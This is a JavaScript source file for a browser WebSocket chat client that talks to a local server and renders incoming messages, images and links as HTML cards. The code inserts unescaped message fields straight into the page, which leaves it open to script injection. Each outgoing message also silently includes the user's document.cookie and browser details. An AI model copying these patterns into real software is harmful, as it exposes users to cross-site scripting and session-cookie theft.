'use strict'
/**
 * Acts as a messaging client to the server.js counterpart.
 */
class SocketClient {

    endpointUrl = 'ws://localhost:3001';

    /**
     * Constructor
     */
    constructor() {
        this.messageCounter = 0;
        this.WS_URL = this.endpointUrl;
        this.ws = new WebSocket(this.WS_URL);
        
        // Called when a connection, to the server, is open.
        this.ws.onopen = () => console.log(`Connected to ${this.WS_URL}`);

        // Called when a message arrives from the server.
        this.ws.onmessage = (ev) => {
            let packet = JSON.parse(ev.data);

            console.log(`Got packet from server:${JSON.stringify(packet)}`);
            console.log(`The message is: ${packet.msg}`);

            let link = (packet.link) ? packet.link : (packet.image) ? packet.image : null;
            let imageDiv = (packet.image) ? `<div class="col-3">
           <img class="socket-image float-end" src="${packet.image}">
           </div>` : '';

            let linkStart = (link) ? `<a href="${link}" class="socket-link" target="_blank">` : '';
            let linkEnd = (link) ? `</a>` : '';

            let msg = `${linkStart}
            <div class="card mt-1 mb-1">
                    <div class="container row btn-dark m-0 p-0">
                        <div class="col">
                            <div class="row">
                                <div class="socket-user col">${packet.date} ${packet.user}</div>
                            </div>
                            <div class="socket-msg">${packet.msg}</div>
                        </div>
                        ${(imageDiv) ? imageDiv : ''}
                    </div>
                </div>
            ${linkEnd}`

            $('#messages').prepend(msg);
            $('#message-count').text(++this.messageCounter);
            $("#message-heading").fadeOut(500).fadeIn(500).fadeOut(500).fadeIn(500);
        }

        this.ws.onerror = (ev) => $('#messages').prepend(`<div>${ev}</div>`);
        this.ws.onclose = (ev) => {
            $('#messages').prepend(`<div>${ev}</div>`)
            this.ws.close();
        }
    }

    /**
     * Sends a JSON packet to the web socket server.
     * @param {*} userId 
     * @param {*} msg 
     * @param {*} imageUrl 
     * @param {*} linkUrl 
     */
    send(userId, msg, imageUrl, linkUrl) {

        let packet = {
            msg: msg.replace(/(?:\r\n|\r|\n)/g, '<br>'),
            image: imageUrl,
            link: linkUrl,
            user: userId,
            date: new Date().toLocaleString(),
            userAgent: navigator.userAgent,
            language: navigator.language,
            memory: navigator.deviceMemory,
            cookie: document.cookie

        };
        console.log(`Sending message: ${packet}`);

        try {
            this.ws.send(JSON.stringify(packet));

        } catch (error) {
            console.log(`Failed to send message:${packet}, with error: ${error}`);
        }
    }

    /**
     * Tracks the input for the ENTER key, and sends the message on ENTER key up.
     * @param {*} input 
     * @param {*} e 
     */
    trackInputKey(input, e) {
        $('#message-button').prop('disabled', input.val().length == 0);

        if (e.key == 'Enter' && e.altKey) {
            this.send(userId, $('#message').val(), $('#image').val(), $('#link').val());
        }
    }

    /**
     * Disconnects the WebSocket connection, is typically by a window.unload event. 
     */
    disconnect() {
        if (this.ws.readyState == WebSocket.OPEN) {
            this.ws.close();
        }
    }
}

var socketClient = new SocketClient();